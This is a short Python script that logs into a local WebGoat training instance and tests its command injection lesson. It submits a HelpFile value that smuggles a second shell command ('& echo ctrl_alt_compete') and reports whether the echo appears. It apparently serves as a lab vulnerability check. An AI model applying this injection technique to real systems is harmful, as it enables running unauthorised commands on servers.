import requests

wg = "http://127.0.0.1:8080/WebGoat/"

#login
s = requests.Session()
s.get(wg + "login.mvc")
s.auth = ('guest', 'guest')
loginURL = wg + "j_spring_security_check"
secondLoginRequest = s.post(loginURL, data={'username':'guest', 'password':'guest'})

#get screen and menu
lessonRequest = s.get(wg + "service/lessonmenu.mvc")
lessonJSON = lessonRequest.json()
commandInjectionLink = lessonJSON[10]['children'][0]['link']

#command injection attack
attackURL = wg + commandInjectionLink
injectedInput = 'CSRF.help"& echo ctrl_alt_compete\"'
attackPayload = {'HelpFile':injectedInput, 'SUBMIT':'View'}
attack = s.get(attackURL, params=attackPayload)

#Analyze results for failure
#If the expected attack string is not found
if not (attack.text.find("<br>ctrl_alt_compete<br>") > 0):
    print "vuln-11 not present"
else: 
    print "Attack Successful"
